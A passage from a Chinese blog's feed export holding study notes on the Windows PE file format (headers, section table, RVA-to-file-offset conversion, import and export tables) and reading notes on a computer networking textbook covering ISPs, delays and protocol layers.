class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**Machine:**两个字节，标识CPU型号。<br>**NumberOfSections:**标识节区数目，两个字节。<br>**SizeOfOptionalHeader:**标识可选头的大小<br>**Characteristic:**标识文件属性，bit OR的形式，每一位代表一种信息，两个字节。<br>其他三个成员都是四个字节。</p><p><strong>可选头</strong>的成员比较多，以可选头起始位置为基准，使用偏移量（十六进制）来描述重要成员。</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_OPTIONAL_HEADER {WORD    Magic;            //标志字(32位时0x10Bh)BYTE    MajorLinkerVersion;        //连接器版本号BYTE    MinorLinkerVersion;        //DWORD   SizeOfCode;            //代码段大小DWORD   SizeOfInitializedData;    //已初始化数据块大小DWORD   SizeOfUninitializedData;    //未初始化数据块大小DWORD   AddressOfEntryPoint;     //EP的RVA值，程序最先执行代码的地址DWORD   BaseOfCode;            //代码段起始RVADWORD   BaseOfData;            //数据段起始RVADWORD   ImageBase;            //PE文件的装载地址DWORD   SectionAlignment;        //块对齐，节区在内存中最小单位DWORD   FileAlignment;        //文件块对齐，节区在文件中的最小单位WORD    MajorOperatingSystemVersion;//所需操作系统版本号WORD    MinorOperatingSystemVersion;//WORD    MajorImageVersion;        //用户自定义版本号WORD    MinorImageVersion;        //WORD    MajorSubsystemVersion;    //win32子系统版本。若PE文件是专门为Win32设计的WORD    MinorSubsystemVersion;    //该子系统版本必定是4.0否则对话框不会有3维立体感DWORD   Win32VersionValue;        //保留DWORD   SizeOfImage;            //内存中整个PE映像体的尺寸DWORD   SizeOfHeaders;        //所有头+节表的大小，即整个PE头的大小DWORD   CheckSum;            //校验和WORD    Subsystem;            //NT用来识别PE文件属于哪个子系统（系统驱动、GUI、CUI）WORD    DllCharacteristics;        DWORD   SizeOfStackReserve;        DWORD   SizeOfStackCommit;        DWORD   SizeOfHeapReserve;        DWORD   SizeOfHeapCommit;        DWORD   LoaderFlags;            DWORD   NumberOfRvaAndSizes;    //指定DataDirectory数组的个数IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];//IMAGE_DATA_DIRECTORY 结构数组。每个结构给出一个重要数据结构的RVA，比如引入地址表等} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可选头的成员比较多，我们以可选头起始位置为基准，使用偏移量（十六进制）来描述重要成员。<br>Magic成员，32位系统可选头是010B，64位是020B。<br>AddressOfEntryPoint，标识PE文件的入口点地址（这个地址是相对虚拟地址）。<br>ImageBase成员，用来标识装载到内存时文件的起始位置。<br>SectionAlignment成员，标识节区在内存中的最小单位。<br>FileAlignment成员，标识节区在文件中的最小单位。<br>成员SizeOfImage，标识着文件加载到内存之后，在内存中的大小。<br>成员SizeOfHeaders，标识着PE头的大小，同时也就标识着第一节区头的偏移量。<br>成员Subsystem，标识着文件的类型，1表示驱动文件（sys）2表示窗口应用程序3表示控制台应用程序。<br>成员NumberOfRvaAndSizes，标识着DataDirectory成员的个数。<br>最后一个成员是一个结构体数组：DataDirectory，每个数组成员的大小是8个字节，成员的数目由NumberOfRvaAndSizes来给出，默认是16个。</p><p><strong>节区头</strong></p><pre class="line-numbers language-none"><code class="language-none">#define IMAGE_SIZEOF_SHORT_NAME 8typedef struct _IMAGE_SECTION_HEADER{     BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8个字节的节区名称      union {          DWORD PhysicalAddress;                 DWORD VirtualSize;            //内存中节区的大小    } Misc;     DWORD VirtualAddress;         // 内存中节区的起始地址（RVA）      DWORD SizeOfRawData;            // 磁盘中文件中节区所占大小    DWORD PointerToRawData;        // 磁盘中文件的起始位置      DWORD PointerToRelocations;     // 在OBJ文件中使用，重定位的偏移      DWORD PointerToLinenumbers;   // 行号表的偏移（供调试使用地）      WORD NumberOfRelocations;      // 在OBJ文件中使用，重定位项数目      WORD NumberOfLinenumbers;    // 行号表中行号的数目      DWORD Characteristics;       // 节属性如可读，可写，可执行等  } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>节区头定义了各个节区的属性。将代码、数据资源分为不同的节区存放的好处是保证程序的安全性。节区头是由结构体数组组成的。每个数组元素对应一个节区。每个数组元素都是一个结构体，每个结构体内成员个数是一样的。<br>第一个成员是name，标识着节区名字，默认为八个字节，可以变更。<br>第二个成员是一个联合体，物理地址PhysicalAddress和虚拟空间大小VirtualSize，四个字节（两个成员存储任意一个，这里一般存储后一个），VitualSize标识着该节区在内存中的大小。<br>第三个成员位虚拟地址，VirtualAddress，占用四个字节；<br>第四个成员SizeOfRawData，标识着该节区在磁盘中的大小，四个字节。<br>第五个成员PointerToRawData，四个字节。<br>第三、五个成员的值一般与可选头中SectionAlignment和FileAlignment成员的值的整数倍。</p><p><img src="/2019/10/21/PE%E6%96%87%E4%BB%B6/image-20250921172248881.png"></p><h2 id="VA，RVA，RAW"><a href="#VA，RVA，RAW" class="headerlink" title="VA，RVA，RAW"></a>VA，RVA，RAW</h2><p><strong>RVA:</strong> <a href="https://www.baidu.com/s?wd=%E7%9B%B8%E5%AF%B9%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd">相对虚拟地址</a>:是指相对于基地址的偏移量。也就是PE结构被映射到内存中后，某个位置所在内存相对于基地址的偏移。即：相对虚拟地址(RVA)=虚拟地址（VA）-基址（imageBase）。</p><p><strong>基地址（imageBase）：</strong>　文件执行时将被映像到指定内存地址中，这个初始内存地址称为基址。</p><p><strong>VA（虚拟地址）：</strong>由于windows运行在保护模式下，所以程序访问存储器所使用的逻辑地址就是<a href="https://www.baidu.com/s?wd=%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd">偏移地址</a>，简称VA，又称为内存<a href="https://www.baidu.com/s?wd=%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd">偏移地址</a>。也就是程序被加载到内存中的地址。</p><p>**RAW:**文件偏移</p><h3 id="虚拟内存地址-VA-virtual-Address"><a href="#虚拟内存地址-VA-virtual-Address" class="headerlink" title="虚拟内存地址 VA (virtual Address)"></a>虚拟内存地址 VA (virtual Address)</h3><p>就是PE文件在内存中的地址，因为用的是虚拟内存技术来管理内存，所以叫做虚拟内存，而物理内存是系统已经帮我们封装好了，所以我们不需要去管物理内存。<br>在od中打开一个PE文件，这些都是VA</p><p><img src="/2019/10/21/PE%E6%96%87%E4%BB%B6/image-20250921172315474.png"></p><h3 id="相对虚拟地址-RVA（Relative-Virtual-Address）"><a href="#相对虚拟地址-RVA（Relative-Virtual-Address）" class="headerlink" title="相对虚拟地址 RVA（Relative Virtual Address）"></a>相对虚拟地址 RVA（Relative Virtual Address）</h3><p>相对虚拟地址是内存地址基于基地址的偏移，规则是VA=IMage Base+RVA</p><p><img src="/2019/10/21/PE%E6%96%87%E4%BB%B6/image-20250921172335824.png"></p><p>假设虚拟地址VA为00401518，要想知道相对偏移RVA，就要知道00401528属于那个节区，点M查看，是.text 也就是代码区，从00401000开始的，即RVA=00401518-00401000=518</p><p><img src="/2019/10/21/PE%E6%96%87%E4%BB%B6/image-20250921172351889.png"></p><h3 id="文件偏移地址（File-Offset）"><a href="#文件偏移地址（File-Offset）" class="headerlink" title="文件偏移地址（File Offset）"></a>文件偏移地址（File Offset）</h3><p>数据在PE文件的偏移位置，通俗的讲就是文件的第几个字节，比如文件偏移地址为0x400，那么指的就是文件的第0x400个字节的地方。</p><h3 id="基地址（Image-Base）"><a href="#基地址（Image-Base）" class="headerlink" title="基地址（Image Base）"></a>基地址（Image Base）</h3><p>PE装入内存的地方，相当于使用fread()函数把PE文件读入内存，而基地址就相当于PE在内存中的首地址，默认exe文件在内存中的基地址是0x00400000（不一定是，站长的32位的Win8的基地址就不是，一般为0x00EB0000），dll文件是0x10000000。</p><h3 id="相对虚拟地址（Relative-Virtual-Address，RVA）"><a href="#相对虚拟地址（Relative-Virtual-Address，RVA）" class="headerlink" title="相对虚拟地址（Relative Virtual Address，RVA）"></a>相对虚拟地址（Relative Virtual Address，RVA）</h3><p>相对虚拟地址是内存地址基于基地址的偏移，规则是VA=IMage Base+RVA</p><h3 id="物理地址偏移（Raw-Offset，RO）"><a href="#物理地址偏移（Raw-Offset，RO）" class="headerlink" title="物理地址偏移（Raw Offset，RO）"></a>物理地址偏移（Raw Offset，RO）</h3><p>这个一般是相对于PE文件在文件中的各区块而言的文件偏移地址。我觉得简单来说这就是一个特殊的File Offset</p><h3 id="VA-to-RAW"><a href="#VA-to-RAW" class="headerlink" title="VA to RAW"></a>VA to RAW</h3><p>想要知道在文件中的偏移，首先要通过VA计算出RVA（如上所示），在通过RAV计算RAW，这时就需要查看区段表了</p><p><img src="/2019/10/21/PE%E6%96%87%E4%BB%B6/image-20250921172419222.png"></p><p>VOffset是内存中的偏移<br>VSize是内存中的大小<br>ROffset是文件中的偏移<br>RSize是文件中的大小<br>则RAW=400+518=918</p><h2 id="IAT导入地址表-EAT机制"><a href="#IAT导入地址表-EAT机制" class="headerlink" title="IAT导入地址表/EAT机制"></a>IAT导入地址表/EAT机制</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>DLL是动态链接库，是win特有的系统，16位的DOS时代不存在DLL概念，只有”库”，当需要使用库函数时，编译器会将库函数一起插入到应用程序中。当运行多个程序时，会造成资源浪费，于是引入了动态链接库，内存映射技术使得加载后的DLL代码、资源在多个进程中实现共享。</p><p><strong>加载DLL的两种方法</strong><br>1.<strong>显示链接：</strong>程序使用DLL的时候加载，使用完毕释放内存。<br>2.<strong>隐式链接：</strong>程序开始时即一同加载DLL，程序终止时在释放内存。</p><h3 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_IMPORT_DESCRIPTOR {union {DWORD Characteristics;DWORD OriginalFirstThunk;//INT(Import Name Table) address (RVA)};DWORD TimeDateStamp;DWORD ForwarderChain;DWORD Name;//library name string address (RVA)DWORD FirstThunk;//IAT(Import Address Table) address (RVA)} IMAGE_IMPORT_DESCRIPTOR; typedef struct _IMAGE_IMPORT_BY_NAME {WORD Hint;//ordinalBYTE Name[1];//function name string} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;&lt;/span&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体中记载了PE文件要导入哪些库文件,每个结构体中包含一个库文件的INT地址数组、Name数组和IAT地址数组，以NULL结束。</p><blockquote><p>OriginalFirstThunk INT的地址<br>Name 库名称字符串的地址<br>FirstThunk IAT的地址<br>INT与IAT是长整型(4个字节数据类型)数组，以NULL结束<br>INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针（有时IAT也拥有相同的值）<br>INT与IAT的大小应相同</p></blockquote><p><strong>IAT装载顺序</strong></p><ol><li>读取IID的Name成员，获取库名称字符串（如“Kernel32.dll”）</li><li>装载相应库，通过LoadLibrary(“Kernel32.dll”)</li><li>读取IID的OriginalFirstThunk成员，获取INT地址</li><li>逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址</li><li>使用IMAGE_IMPORT_BY_NAME的HINT或NAME项，获取相应函数的起始地址，通过GetProcAdress(“GetCurrentThreadld”)</li><li>读取IID的FirstThunk成员，获得IAT地址</li><li>将上面获得的函数地址放入相应的IAT数组值</li><li>重复4-7步骤，将所有INT装载（以NULL结束）</li></ol><h3 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h3><p>EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数。</p><p>也就是说，要通过EAT才能求得从相应库中导出函数的起始地址。</p><h3 id="IMAGE-EXPORT-DIRECTORY"><a href="#IMAGE-EXPORT-DIRECTORY" class="headerlink" title="IMAGE_EXPORT_DIRECTORY"></a>IMAGE_EXPORT_DIRECTORY</h3><p>PE文件内的IMAGE_EXPORT_DIRECTORY结构体保存着导出信息，PE文件的PE头通过查找IMAGE_EXPORT_DIRECTORY结构体的位置，也就时结构体数组的起始位置。</p><pre class="line-numbers language-none"><code class="language-none">typedef struct_IMAGE_DIRECTORE{DWORD Characteristics DWORD TimeDateStamp          ; 文件生成时间WORD MajorVersion            ; 未使用，总是定义为0WORD MinorVersion            ; 未使用，总是定义为0DWORD Name                   ; 模块的真实名称DWORD Base                   ; 基数，加上序数就是函数地址数组的索引值DWORD NumberOfFunctions      ; 导出函数的总数DWORD NumberOfNames          ; 以名称方式导出的函数的总数DWORD AddressOfFunctions     ; 指向输出函数地址的RVADWORD AddressOfNames         ; 指向输出函数名字的RVADWORD AddressOfNameOrdinals  ; 指向输出函数序号的RVA};IMAGE_EXPORT_DIRECTORY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结构体中的重要成员</strong><br><strong>1.NumberOfFunctions：</strong>表示实际导出函数的个数<br><strong>2.NumberOfNames：</strong>表示有名字的导出函数的个数<br><strong>3.AddressOfFunctions：</strong>表示导出函数地址数组<br><strong>4.AddressOfNames：</strong>表示导出函数的名字字符串数组<br><strong>5.AddressOfNameOrdinals</strong></p><h3 id="GetProcAddress（-操作原理"><a href="#GetProcAddress（-操作原理" class="headerlink" title="GetProcAddress（)操作原理"></a><strong>GetProcAddress（)操作原理</strong></h3><p>1.利用AddressOfNames成员找到函数名称数组；其中保存着导出函数的Names字符串；通过Strcmp字符串查找指定的函数名称，得到索引（name_index）<br>2.利用AddressOfNameOrdinals成员，转到ordinal数组；其中保存着导出函数的ordinal索引与实际地址索引的对应关系（通常是相同的，但是当出现无名导出函数，ordinal中无，而实际地址中有时，两个索引就不同了）；通过name_index找到对应的ordinal值<br>3.利用AddressOfFunctions成员，转到函数地址数组（EAT）；其中保存着函数与实际地址的关系；通过ordinal值找到地址</p><p><img src="/2019/10/21/PE%E6%96%87%E4%BB%B6/image-20250921172839972.png"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《计算机网络自顶向下方法》读书笔记</title>
      <link href="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、计算机网络和因特网"><a href="#一、计算机网络和因特网" class="headerlink" title="一、计算机网络和因特网"></a>一、计算机网络和因特网</h2><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920160427981.png"></p><h2 id="什么是因特网"><a href="#什么是因特网" class="headerlink" title="什么是因特网"></a>什么是因特网</h2><h3 id="什么是因特网-1"><a href="#什么是因特网-1" class="headerlink" title="什么是因特网"></a>什么是因特网</h3><h4 id="具体构成描述"><a href="#具体构成描述" class="headerlink" title="具体构成描述"></a>具体构成描述</h4><p>主机(端系统)通过通信链路和分组交换机连接到一起，遵守一定协议以分组的形式相互传递数据</p><h4 id="服务描述"><a href="#服务描述" class="headerlink" title="服务描述"></a>服务描述</h4><p>各种涉及多台相互交换数据的端系统的应用程序通过因特网提供给每台端系统的应用编程接口(API)完成不同端系统的数据交换，以完成该应用程序的运行。即因特网是为应用程序提供服务的基础设施。</p><p><code>主机：</code>主机通过 <code>通信链路</code> 和 <code>分组交换机</code> 连接<br><code>分组交换机</code> 典型的有：<code>路由器</code> （router)、 <code>链路层交换机</code>(link-layer switch)</p><p><code>端系统：</code> 通常把与因特网相连的计算机和其他设备称为端系统。端系统是通信链路和分组交换机连接在一起的</p><p><code>ISP：</code>因特网服务提供商</p><p><code>分组：</code> 发送端系统将数据分段，并为每段加上首部字节</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p><code>TCP：</code> 传输控制协议</p><p><code>IP：</code> 网络协议</p><p>端系统，分组交换机和其他因特网部件都要运行一系列协议，这些协议控制因特网中信息的接收和发送，IP协议定义了在路由器的端系统之间发送和接受的分组格式，因特网中的协议统称为TCP/IP</p><p><code>协议：</code> 定义了在两个或多个通信实体之间交换的报文和顺序，以及报文发送和接收一条报文或其他事件所采取的动作</p><h2 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h2><h3 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h3><p><code>接入网：</code> 接入网是指将端系统物连接到其边缘路由器的网络</p><p><code>边缘路由器：</code> 端系统到任何其他远程端系统的路径上的第一台路由器。</p><p>1.家庭接入：DSL，电缆，FTTH，拨号和卫星</p><p>2.企业接入：以太网和wife</p><p>3.广域无限接入：3G和LTE</p><h3 id="物理媒体"><a href="#物理媒体" class="headerlink" title="物理媒体"></a>物理媒体</h3><p>物理媒体分为两类：</p><p><code>导引型媒体：</code> 电波沿着固体媒体（光缆，双绞铜线或同轴电缆）被导引。</p><p><code>非导引型媒体：</code> 电波在空气或外层空间（在无线局域网或数字卫星频道）中传播</p><p>1.双绞铜线<br>2.同轴电缆<br>3.光纤<br>4.陆地无线电信道<br>5.卫星无线电信道</p><h2 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h2><pre class="line-numbers language-none"><code class="language-none">网络核心，即互联了因特网端系统的分组交换机和链路的网状网络<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><h4 id="储存转发运输"><a href="#储存转发运输" class="headerlink" title="储存转发运输"></a>储存转发运输</h4><p><code>存储转发机制：</code> 多数分组交换机在链路的输入端使用储存转发运输，交换机能够开始向输出链路传输该分组的第一个比特之前，必须接受到整个分组。</p><p><code>时延：</code> <code>d=NL/R</code> (N为链路数目，R为速率，L是链路长度)</p><h4 id="排队时延和分组丢失"><a href="#排队时延和分组丢失" class="headerlink" title="排队时延和分组丢失"></a>排队时延和分组丢失</h4><p>每个分组交换机有多条链路相连，对于每条相连的链路，交换机具有输出缓存。除了存储转发时延，分组还要承受输出缓存的排队时延。当一个到达的分组发现该缓存已经被其他分组充满时，就会出现分组丢包。</p><h4 id="转发表和路由选择协议"><a href="#转发表和路由选择协议" class="headerlink" title="转发表和路由选择协议"></a>转发表和路由选择协议</h4><p>在因特网中，每台端系统具有一个IP地址，每台路由器具有一个转发表(用于将目的地址(或者其一部分)映射为输出链路)。因特网中具有一些特殊的路由选择协议，用于自动设置转发表。</p><h3 id="电路交换（创建专用的端到端连接）"><a href="#电路交换（创建专用的端到端连接）" class="headerlink" title="电路交换（创建专用的端到端连接）"></a>电路交换（创建专用的端到端连接）</h3><p>在电路交换网络中，端系统通信会话期间，预留了端系统通信沿电路所需要的资源(缓存，链路传输速率)。在分组交换网络中，这些资源是不被预留的，会话报文按需使用这些资源，可能不得不等待(排队)接入通信线路。传统的电话网络是电路交换。</p><p>经过建立连接(占用通信资源)=&gt;通话(一直占用通信资源)=&gt;释放连接(归还通信资源)三个步骤的交换方式成为电路交换。</p><p>电路交换的一个重要特点就是在通话的全部时间内，通话的两个用户始终占用端到端的通信资源</p><h4 id="电路交换在网络中的复用"><a href="#电路交换在网络中的复用" class="headerlink" title="电路交换在网络中的复用"></a>电路交换在网络中的复用</h4><pre class="line-numbers language-none"><code class="language-none">频分复用` 或 `时分复用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="分组交换和电路交换的对比"><a href="#分组交换和电路交换的对比" class="headerlink" title="分组交换和电路交换的对比"></a>分组交换和电路交换的对比</h4><p>1.分组交换不适合实时服务，因为端到端时延是不可预测的。</p><p>2.分组交换提供了比电路交换更好的带宽共享</p><p>3.分组交换比电路交换更简单，更有效，实现成本更低</p><h3 id="网络中的网络"><a href="#网络中的网络" class="headerlink" title="网络中的网络"></a>网络中的网络</h3><h4 id="因特网是网络的网络。"><a href="#因特网是网络的网络。" class="headerlink" title="因特网是网络的网络。"></a>因特网是网络的网络。</h4><p>在公共因特网中，坐落在因特网边缘的接入网络通过分层的ISP层次结构和因特网其他部分相连。</p><p>因特网由十多个第一层ISP和数十万个较低层ISP组成，不同ISP覆盖不同的区域。较低层的ISP和叫高层的ISP相连，较高层ISP彼此互联。位于相同的等级结构的临近一对ISP能够对等，即直接传输数据不收取费用。同时第三方公司也会提供因特网交换点(IXP)，作为各种ISP的汇集点。用户和内容提供商是较低层ISP的客户，较低层ISP是较高层ISP的客户。近年来，主要的内容提供商已经开始创建自己的网络，直接在可能的地方与较低层ISP互联</p><h4 id="第一层ISP"><a href="#第一层ISP" class="headerlink" title="第一层ISP"></a>第一层ISP</h4><p>第一层ISP和其他ISP相同点：</p><p>有链路和路由器</p><p>不同之处：</p><ol><li>链路速度通常为622Mbps或更高。大型第一层ISP，其链路速率的范围为2.5~10Gbps。</li><li>直接和其他每个第一层ISP相连，和大量第二层ISP和其他客户网络相连。</li><li>覆盖国际范围。</li></ol><h4 id="第二层ISP"><a href="#第二层ISP" class="headerlink" title="第二层ISP"></a>第二层ISP</h4><p>第二层ISP：具有区域性或国家性覆盖范围；第一层ISP的客户。</p><p>许多大公司和机构将他们的企业网直接与第一层或第二层ISP相连，因而成为该ISP的客户。第一层ISP相对于该客户而言是提供商。一个提供商ISP向他的客户收费，费用通常根据连接两者的带宽而定。</p><p>一个第二层网络也可以选择与其他第二层网络直接相连。</p><h4 id="较低层ISP"><a href="#较低层ISP" class="headerlink" title="较低层ISP"></a>较低层ISP</h4><p>在第二层ISP之下是较低层的ISP，这些较低层ISP经过一个或多个第二层ISP和更的因特网相连。</p><p>当两个ISP彼此直接相连时，它们被称为彼此是对等的。</p><p>在一个ISP的网络中，某ISP和其他ISP的连接点被称为 <code>汇集点</code></p><p>（Point of Presence,POP）。POP就是某ISP网络中的一台或多台路由器组，通过它们能够和其他ISP的路由器连接。</p><pre class="line-numbers language-none"><code class="language-none">一个第一层提供商通常有许多POP，这些POP分桑在其网络中不同的地理位置。每个POP与多个客户网络和其他ISP相连。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因特网的拓扑很复杂，他由几十个第一层ISP和第二层ISP和数以千计的较低层ISP组成。</p><h2 id="分组交换网中的时延，丢包和吞吐量"><a href="#分组交换网中的时延，丢包和吞吐量" class="headerlink" title="分组交换网中的时延，丢包和吞吐量"></a>分组交换网中的时延，丢包和吞吐量</h2><h3 id="分组交换网中的时延概述"><a href="#分组交换网中的时延概述" class="headerlink" title="分组交换网中的时延概述"></a>分组交换网中的时延概述</h3><p>时延是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间</p><p>时延分为节点处理时延（nodal processing delay），排队时延（queuing delay），传输时延（transmission delay）和传播时延（propagation delay），这些加起来就是节点总时延（total nodal delay），即<br>节点总时延 = 节点处理时延 + 排队时延 + 传输时延 + 传播时延</p><h4 id="时延的类型"><a href="#时延的类型" class="headerlink" title="时延的类型"></a>时延的类型</h4><p>处理时延：`检查分组首部和决定将分组导向哪一个队列。检查比特级差错所需要的时间。</p><p><code>排队时延</code>：分组在链路上等待传输的时间</p><p><code>传输时延</code>：将所有分组的比特推（传输）向链路所需要的时间。<br>用L比特表示分组的长度，用R bps(b/s)表示从路由器A到路由器B的链路传输速率。传输时延是L/R</p><p><code>传播时延：</code>从链路的起点到下一个路由器的时间，取决于链路的物理媒体和链路长度。</p><p>传播时延 = 两台路由器的距离d / 传播速率s</p><h3 id="排队时延和丢包"><a href="#排队时延和丢包" class="headerlink" title="排队时延和丢包"></a>排队时延和丢包</h3><p>a表示分组到达队列的平均速度（a的单位是分组每秒pkt/s）<br>R是传输速率，即从队列中推出比特的速率（bps即b/s为单位）<br>所有的分组都是由L比特组成的，比特的平均速率为La bps<br>比率La/R称为 <code>流量强度</code></p><p>如果La/R&gt;1,则比特到达队列的平均速率超过从该队列传输出去的速率<br>La/R&lt;=1,到达流量的性质影响排队延时<br>第n个分组具有（n-1）L/R秒的排队延时</p><p>La/R &gt; 1，则比特到达队列的平均速率超过从该队列传输出去的速率。在这种不幸的情况下，队列的增加将趋近于无界，并且排队时延将趋向无穷大。因此，流量工程中设计系统时流量强度不能大于1。在因特网中，接近1时将容易发生丢包</p><h3 id="端到端的时延"><a href="#端到端的时延" class="headerlink" title="端到端的时延"></a>端到端的时延</h3><p>假定在源主机和目的主机之间有N-1台路由器，并且该网络是无拥塞的（因此排队时延是微不足道的），处理时延为dproc，每台路由器和源主机的输出速率是 R bps，每条链路的传播时延是dprop，节点时延累加起来得到端到端时延</p><p>dend-end = N（dproc + dtrans + dprop）<br>dtrans= 分组长度L /R</p><h3 id="计算机网络的吞吐量"><a href="#计算机网络的吞吐量" class="headerlink" title="计算机网络的吞吐量"></a>计算机网络的吞吐量</h3><pre class="line-numbers language-none"><code class="language-none">吞吐量分为瞬时吞吐量（instancous throughput）和平均吞吐量（average throughput）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>瞬时吞吐量:</code>主机接收文件的速率是瞬时吞吐量。</p><p><code>平均吞吐量：</code>接收F比特用去T秒，平均吞吐量是F/T bps</p><h2 id="协议层次及其服务类型"><a href="#协议层次及其服务类型" class="headerlink" title="协议层次及其服务类型"></a>协议层次及其服务类型</h2><h3 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h3><p>各层的所有协议被称为协议栈（protocol stack）。</p><p><code>分层的优点：</code>改变服务的实验而不影响该系统其它部分的能力</p><pre class="line-numbers language-none"><code class="language-none">分层提供一种结构化方式来讨论系统组件，各层的所有协议被称为协议栈。因特网的协议栈分为5层：物理层、链路层、网络层、运输层和应用层。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="TCP-IP各层描述："><a href="#TCP-IP各层描述：" class="headerlink" title="TCP/IP各层描述："></a>TCP/IP各层描述：</h3><p>应用层：端到端，应用层的通信处于两个进程（该层正在运行的两个程序）之间，进程到进程的通信就是应用层的任务</p><p>HTTP:超级文本传输协议是访问万维网的载体</p><p>SMTP:简单邮件传输协议是电子邮件服务的主要协议</p><p>FTP:文件传输协议用于将文件从一台主机传输到另一台主机</p><p>TELNET:远程登陆 和SSH:安全外壳 用于访问远端的站点</p><p>SNMP:简单网络管理协议，用于对Internet全局或局部进行管理</p><p>DNS:域名系统：使其他的协议能够查询另一台计算机的网络层地址</p><p>IGMP:英特网组管理协议，用于管理一个组的成员资格</p><h3 id="分层的体系结构"><a href="#分层的体系结构" class="headerlink" title="分层的体系结构"></a>分层的体系结构</h3><p><code>应用层：</code> 是网络应用程序及其应用层协议存留的地方，包括HTTP，SMTP、FTP。报文</p><p><strong><code>运输层：</code></strong> 在应用程序端点之间传送应用层报文。TCP和UDP协议。TCP提供面向连接的服务，包括应用层报文向目的地的确保传递和流量控制；也将长报文分为短报文，提供拥塞控制。UDP提供无连接服务，没有可靠性、流量控制、拥塞控制。报文段</p><p><strong><code>网络层</code>：</strong><br>负责将运输层提交的报文段和目的地址传递到另一台主机。IP协议：定义了数据报中各个字段以及端系统和路由器如何作用于这些字段，也包括路由选择协议。数据报</p><p><strong><code>链路层</code>：</strong> 将网络层的数据报从一个结点（主机或路由器）移动到下一个结点。帧</p><p><strong><code>物理层：</code></strong> 将帧中的每一个比特从一个结点移动到下一个结点。</p><p><strong><code>osi模型：</code></strong> 物理层、链路层、网络层、运输层、会话层、表示层、应用层。</p><p><strong><code>表示层：</code></strong> 使通信的应用程序能够解释交换数据的含义。</p><p><strong><code>会话层：</code></strong> 提供了数据交换定界和同步功能。</p><h3 id="封装"><a href="#封装" class="headerlink" 